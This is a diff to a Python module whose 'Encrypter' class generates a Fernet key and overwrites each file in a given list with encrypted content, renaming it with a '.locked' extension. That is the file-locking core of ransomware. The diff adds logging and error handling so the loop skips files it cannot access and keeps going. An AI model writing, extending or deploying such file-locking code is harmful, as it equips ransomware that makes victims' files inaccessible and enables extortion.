@@ -28,7 +28,9 @@
 
 from pathlib import Path
 from cryptography.fernet import Fernet
+import logging
 
+logger = logging.getLogger(__name__)
 
 class Encrypter:
     """
@@ -39,6 +41,7 @@ class Encrypter:
     def __init__(self) -> None:
         self.key: bytes = self.gen_key()
         self.fernet: Fernet = Fernet(self.key)
+        logger.info("Encryption key generated.")
 
     def gen_key(self) -> bytes:
         """
@@ -58,8 +61,13 @@ class Encrypter:
             files (list[Path]): A list of file paths to be encrypted.
         """
         for file in files:
-            file.write_bytes(self.encrypt_bytes(file.read_bytes()))
-            file.rename(file.name + ".locked")
+            try:
+                logger.info("Trying to encrypt %s", file.name)
+                file.write_bytes(self.encrypt_bytes(file.read_bytes()))
+                file.rename(file.name + ".locked")
+                logger.info("Encrypted %s succesfully", file.name)
+            except PermissionError as e:
+                logger.error("Permission denied, skipping: %s. %s", file.name, e)
 
     def encrypt_bytes(self, file_bytes: bytes) -> bytes:
         """
